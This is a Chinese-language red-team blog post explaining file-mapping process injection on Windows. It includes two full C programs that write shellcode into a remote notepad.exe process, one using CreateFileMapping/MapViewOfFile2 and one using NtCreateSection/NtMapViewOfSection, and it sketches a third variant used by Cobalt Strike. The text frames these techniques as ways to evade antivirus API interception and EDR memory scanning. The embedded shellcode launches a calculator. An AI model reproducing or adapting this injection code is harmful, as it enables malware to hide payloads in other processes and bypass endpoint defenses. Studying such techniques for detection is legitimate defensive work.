在远程进程注入之 shellcode 注入的时候，常规方案是：

`VirtualAllocEx` → `WriteProcessMemory`

>注意这里必须是 `VirtualAllocEx` 而非 `VirtualAlloc`，因为 VirtualAlloc 是给调用进程分配内存；而 VirtualAllocEx 才是给另一个进程的地址空间中分配内存。

现在这两个函数都挺敏感的，在下曾经遇到过天擎拦截 `WriteProcessMemory`。当然我们可以对 API 作精修，比如替换为内核函数，这样可以绕过 uerland hook。就算是 inline hook，也可以使用 syscall 进行绕过。

但其实要完成[在远程进程中分配内存并将shellcode复制进去]这一任务，还可以使用一套API链，也就是所谓的映射注入 `File Mapping`。

我不是故意想搞名词，名词是为了概括，东西并不难，我只是记录一条链，不喜勿喷。

# 思路一

`CreateFileMapping` → `MapViewOfFile` → `MapViewOfFile2`


原理见我的亲兄弟idiotc4t的文章 [Mapping Injection](https://idiotc4t.com/code-and-dll-process-injection/mapping-injection)。

`CreateFileMapping`
创建或打开指定文件的命名或未命名文件映射对象。

`MapViewOfFile`
将文件映射的视图映射到调用进程的地址空间。

`MapViewOfFile2`
将文件或页面文件支持的部分的视图映射到指定进程的地址空间。

**概括一下注入流程：**

1. 在注入进程/调用进程创建文件映射对象 mapping（使用 `CreateFileMapping` API）
2. 将 mapping 映射到注入进程的虚拟地址（使用 `CreateFileMapping` API）
3. 往被映射的虚拟地址写入shellcode（`memcpy` 库函数）
4. 打开被注入进程句柄
5. 将 mapping 映射到被注入进程虚拟地址（使用 `MapViewOfFile2` API）


**代码实现（我把这个过程自己封成了一个函数 MappingShellcodeFile）：**


```
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment (lib, "OneCore.lib")
//MapViewOfFile2函数依赖这个静态链接库

BOOL MappingShellcodeFile(LPPROCESS_INFORMATION pi, unsigned char* shellcode, DWORD dwShellcodeLength);

int main(void)
{
	int result;

	//弹计算器 shellcode
	unsigned char shellcode[] =
		"\x55\x8B\xEC\x83\xEC\x20\x64\xA1\x30\x00\x00\x00\x8B\x40"
		"\x0C\x8B\x40\x1C\x8B\x00\x8B\x00\x8B\x40\x08\xC7\x45\xFC"
		"\x00\x00\x00\x00\xC7\x45\xF8\x00\x00\x00\x00\xC7\x45\xF4"
		"\x00\x00\x00\x00\x8B\x58\x3C\x8D\x1C\x18\x8B\x5B\x78\x8D"
		"\x14\x18\x8B\x5A\x1C\x8D\x1C\x18\x89\x5D\xFC\x8B\x5A\x20"
		"\x8D\x1C\x18\x89\x5D\xF8\x8B\x5A\x24\x8D\x1C\x18\x89\x5D"
		"\xF4\x8B\x7A\x18\x33\xC9\x8B\x75\xF8\x8B\x1C\x8E\x8D\x1C"
		"\x18\x8B\x1B\x81\xFB\x57\x69\x6E\x45\x74\x03\x41\xEB\xED"
		"\x8B\x5D\xF4\x33\xD2\x66\x8B\x14\x4B\x8B\x5D\xFC\x8B\x1C"
		"\x93\x8D\x04\x18\xEB\x09\x63\x61\x6C\x63\x2E\x65\x78\x65"
		"\x00\xE8\x00\x00\x00\x00\x5B\x83\xEB\x0E\x6A\x05\x53\xFF"
		"\xD0\x8B\xE5\x5D\xC3";
	DWORD dwShellcodeLength = sizeof shellcode;

	//测试 【MappingShellcodeFile】
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	wchar_t* lpProcessName = _wcsdup(TEXT("notepad.exe"));
	//我自己写的函数，可以用 OpenProcess 替代，传入 pid
	OpenProcessWithProcessNameW(lpProcessName, &pi);
	result = MappingShellcodeFile(&pi, shellcode, dwShellcodeLength);
	printf("result = %d\n", result);

	return 0;
}


BOOL MappingShellcodeFile(LPPROCESS_INFORMATION pi, unsigned char* shellcode, DWORD dwShellcodeLength)
{
	HANDLE hMapping;
	//在注入进程创建 mapping
	hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwShellcodeLength, NULL);
	//将mapping映射到注入进程虚拟地址
	if (hMapping != 0) {
		LPTSTR lpMapAddr = (LPTSTR)MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, dwShellcodeLength);
		if (lpMapAddr != 0) {
			//往被映射的虚拟地址写入shellcode
			memcpy((PVOID)lpMapAddr, shellcode, dwShellcodeLength);

			//打开被注入进程句柄，将mapping映射到被注入进程虚拟地址
			LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, pi->hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
			if (lpMapAddressRemote != 0) {
				//以下两行为测试函数
				//printf("lpMapAddressRemote = %p\n", lpMapAddressRemote);
				//MessageBox(NULL, L"1", NULL, MB_OK);
				return (TRUE);
			}
			else {
				printf("MapViewOfFile2 failed with SYSTEM ERROR CODE: %d.\n", GetLastError());
				return (FALSE);
			}
			
		}
		else {
			printf("MapViewOfFile failed with SYSTEM ERROR CODE: %d.\n", GetLastError());
			return (FALSE);
		}
	}
	else {
		printf("CreateFileMapping failed with SYSTEM ERROR CODE: %d.\n", GetLastError());
		return (FALSE);
	}
}
```

**效果：**




![title](https://leanote.com/api/file/getImage?fileId=5f8d4e94ab644123ff000343)


# 思路二

`NtCreateSection` → `NtMapViewOfSection`

使用两个未公开函数来在远程进程地址空间写入shellcode/代码。

**API 分析**

`NtCreateSection` 

>在 Win32 中，我们使用 CreateFileMapping 来创建映射文件对象，函数原型如下： 

``` 
HANDLE CreateFileMapping(
    HANDLE hFile,  // handle to file to map
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // optional security attributes
    DWORD flProtect,   // protection for mapping object
    DWORD dwMaximumSizeHigh,     // high-order 32 bits of object size 
    DWORD dwMaximumSizeLow, // low-order 32 bits of object size 
    LPCTSTR lpName     // name of file-mapping object
   );
```
 

 

>这个函数会调用 Native Api(Ntdll.dll) 中的 ZwCreateSection （ NtCreateSection ）函数，而后者又通过系统调用 Ntoskrnl.exe 中的 NtCreateSection 函数，其函数原型如下：  
```
NTSTATUS
  NtCreateSection(
    OUT PHANDLE  SectionHandle ,
    IN ACCESS_MASK  DesiredAccess ,
    IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER  MaximumSize OPTIONAL,
    IN ULONG  SectionPageProtection ,
    IN ULONG  AllocationAttributes ,
    IN HANDLE  FileHandle OPTIONAL
    );
```


所以 NtCreateSection 是用来创建进程的共享内存块也就是节的。我们将要用此内核函数创建恶意本地进程与远程目标进程共享的内存块也就是节。


`NtMapViewOfSection`

NtMapViewOfSection\ZwMapViewOfSection 函数映射一个节到目标进程虚拟地址空间的视图。

**原理：**

- 节 `Section` 是在进程之间共享的内存块，可以使用 `NtCreateSection` API 创建。
- 在进程可以读取/写入某内存块之前，它必须映射此节的视图 `view`，这可以通过 `NtMapViewOfSection` 完成。
- 多个进程可以通过映射的视图对节（也就是共享内存块）进行读取和写入。


**注入流程：**

1. 创建一个具有 `RWX` 保护的新内存节（`section`）
2. 映射一个新内存节的视图到本地的恶意进程，传参时候使用 RW 保护
3. 映射一个新内存节的视图到远程目标进程（使用 RX 保护）。请注意，通过用 `RW`（本地）和 `RX`（在目标进程中）映射视图，我们不需要分配带有 `RWX` 的内存页，以规避 EDR 的内存检测。
4. 使用 memcpy 库函数将 shellcode 填入本地进程中映射的视图。因为节是进程之间共享的内存块，所以、目标进程中的映射视图将填充相同的 shellcode。



**代码：（我把这个过程自己封成了一个函数 NtMappingShellcodeFile）**

```
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")
#define _WIN32_WINNT 0x0400
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


BOOL NtMappingShellcodeFile(LPPROCESS_INFORMATION pi, unsigned char* shellcode, DWORD dwShellcodeLength);

int main(void)
{
	int result;

	//弹计算器 shellcode
	unsigned char shellcode[] =
		"\x55\x8B\xEC\x83\xEC\x20\x64\xA1\x30\x00\x00\x00\x8B\x40"
		"\x0C\x8B\x40\x1C\x8B\x00\x8B\x00\x8B\x40\x08\xC7\x45\xFC"
		"\x00\x00\x00\x00\xC7\x45\xF8\x00\x00\x00\x00\xC7\x45\xF4"
		"\x00\x00\x00\x00\x8B\x58\x3C\x8D\x1C\x18\x8B\x5B\x78\x8D"
		"\x14\x18\x8B\x5A\x1C\x8D\x1C\x18\x89\x5D\xFC\x8B\x5A\x20"
		"\x8D\x1C\x18\x89\x5D\xF8\x8B\x5A\x24\x8D\x1C\x18\x89\x5D"
		"\xF4\x8B\x7A\x18\x33\xC9\x8B\x75\xF8\x8B\x1C\x8E\x8D\x1C"
		"\x18\x8B\x1B\x81\xFB\x57\x69\x6E\x45\x74\x03\x41\xEB\xED"
		"\x8B\x5D\xF4\x33\xD2\x66\x8B\x14\x4B\x8B\x5D\xFC\x8B\x1C"
		"\x93\x8D\x04\x18\xEB\x09\x63\x61\x6C\x63\x2E\x65\x78\x65"
		"\x00\xE8\x00\x00\x00\x00\x5B\x83\xEB\x0E\x6A\x05\x53\xFF"
		"\xD0\x8B\xE5\x5D\xC3";
	DWORD dwShellcodeLength = sizeof shellcode;
	
	
    //测试 【NtMappingShellcodeFile】
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	wchar_t* lpProcessName = _wcsdup(TEXT("notepad.exe"));
	OpenProcessWithProcessNameW(lpProcessName, &pi);
	result = NtMappingShellcodeFile(&pi, shellcode, dwShellcodeLength);
	printf("result = %d\n", result);

	return 0;
}


//NtCreateSection → NtMapViewOfSection
BOOL NtMappingShellcodeFile(LPPROCESS_INFORMATION pi, unsigned char* shellcode, DWORD dwShellcodeLength)
{

	typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
	typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
	typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
	using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
	using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);


	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));


	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// 创建一个内存节区（section）
	NTSTATUS status = fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status))
	{
		printf("NtCreateSection failed with SYSTEM ERROR CODE: %d.\n", GetLastError());
		return (FALSE);
	}
	else {
		// 在本地进程中创建内存节区（section）的视图(view）
		NTSTATUS status1 = fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

		// 在目标进程/远程进程中创建一个内存节区（section）的视图(view）
		NTSTATUS status2 = fNtMapViewOfSection(sectionHandle, pi->hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

		if (!NT_SUCCESS(status1) || !NT_SUCCESS(status2)) {
			printf("NtMapViewOfSection failed with SYSTEM ERROR CODE: %d.\n", GetLastError());
			return (FALSE);
		}
		else {
			// 将shellcode复制到本地视图(view），这将反映在目标进程的映射视图中
			memcpy(localSectionAddress, shellcode, dwShellcodeLength);

            //以下两行为便于调试的驱动代码
			//printf("lpMapAddressRemote = %p\n", remoteSectionAddress);
			//MessageBox(NULL, L"1", NULL, MB_OK);
			return (TRUE);
		}	
	}	
}
```

**效果：**


![title](https://leanote.com/api/file/getImage?fileId=5f8d7ae5ab644126020004dd)

# 思路三：

`CreateFileMapping` → `MapViewOfFile` → `NtMapViewOfSection`

也就是上面两条链中的函数替换。Cobalt Strike 的进程注入选项中就有这条链。


......这样的组合可以随意发挥，不再赘述。

CS 的作者在 [Cobalt Strike’s Process Injection: The Details](https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/) 一文中提到：
>要注意到、使用文件映射进行远程进程注入这一方案的缺点是它仅适用于 x86→x86 和 x64→x64。对于跨架构注入，还得选 VirtualAllocEx→ WriteProcessMemory 方案。

但实测不是这样的，使用此方案是可以跨架构注入的，只跟执行函数有关。


-----------------------

# 参考文档：

1. [NtCreateSection & NtMapViewOfSection Code Execute](https://idiotc4t.com/code-and-dll-process-injection/untitled)，idiotc4t's blog，idiotc4t，5个月前
2. [Mapping Injection](https://idiotc4t.com/code-and-dll-process-injection/mapping-injection)，idiotc4t's blog，idiotc4t，6个月前
3. [Cobalt Strike’s Process Injection: The Details](https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/)，Cobalt Strike's blog，August 21, 2019
4. [NtCreateSection + NtMapViewOfSection Code Injection](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection)，Red Teaming Experiments，Last updated 9 months ago
5. [ZwMapViewOfSection function (wdm.h)](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection)，MSDN
6. [ZwCreateSection function (wdm.h)](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection)，MSDN
7. [NtCreateSection](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html)，NTAPI Undocumented Functions
8. [NtMapViewOfSection](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)，NTAPI Undocumented Functions
9. [通过挂钩NtCreateSection监控可执行模块](https://blog.csdn.net/misterliwei/article/details/4506630)，CSDN，misterliwei，2009-09-01
10. [ring3-NtMapViewOfSection注入](https://blog.csdn.net/hgy413/article/details/7799843)，CSDN，花熊，2012-07-29

